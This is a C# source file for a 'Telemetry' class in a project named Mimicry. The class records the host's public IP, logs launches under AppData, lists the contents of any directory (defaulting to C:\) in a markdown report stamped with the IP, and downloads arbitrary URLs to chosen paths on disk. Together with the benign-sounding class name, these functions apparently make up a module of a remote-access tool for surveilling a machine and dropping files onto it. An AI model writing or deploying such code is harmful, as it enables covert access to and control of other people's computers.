using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Data;
using System.Drawing;
using System.Runtime.InteropServices;

namespace Mimicry.Modules
{
    public class Telemetry 
    {
        public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string mimdir = appdata + "\\mimicry";
        public static string mimlog = mimdir + "\\log";
        public static string mimseslog = mimdir + "\\seslog";
        public static string IP;
        
        public Telemetry()
        {
            IP = new WebClient().DownloadString("https://api.ipify.org");
        }

        public void InitializeTelemetry()
        {
            if (!Directory.Exists(mimdir))
            {
                Directory.CreateDirectory(mimdir);
            }
            if (!File.Exists(mimlog))
            {
                File.Create(mimlog);
            }
            File.Delete(mimseslog);
            LogInfo("EXE: Launched");
        }

        public void LogInfo(string content)
        {
            File.AppendAllText(mimlog, IP + " " + DateTime.Now.ToString("HH:mm:ss tt d.MM.y") + " " + content + "\n");
            File.AppendAllText(mimseslog, IP + " " + DateTime.Now.ToString("HH:mm:ss tt d.MM.y") + " " + content + "\n");
        }

        public string getIP()
        {
            return IP;
        }

        public string LoadLog()
        {
            return File.ReadAllText(mimlog);
        }

        public string LoadSesLog()
        {
            return File.ReadAllText(mimseslog);
        }
        
        public string ShowStructure(string path)
        {
            if (path == "")
            {
                path = "C:\\";
            }
            else if (!Directory.Exists(path))
            {
                return "Incorrect path!";
            }
            string[] subfiles = Directory.GetFiles(path);
            string[] subdirs = Directory.GetDirectories(path);
            string res = "Structure of " + path + "@**" + getIP() + "**\n";
            res += "**Files:** \n";
            foreach (string fileName in subfiles)
                res += fileName + "\n";
            res += "**Directories:** \n";
            foreach (string dirName in subdirs)
                res += dirName + "\n";
            return res;
        }

        public string LoadFile(string url, string destname)
        {
            Uri uri = new Uri(url);
            new WebClient().DownloadFileAsync(uri, destname);
            FileInfo dest = new FileInfo(destname);
            if (dest.Exists)
            {
                return dest.FullName;
            }
            else
            {
                return "-1";
            }
        }
    }
}
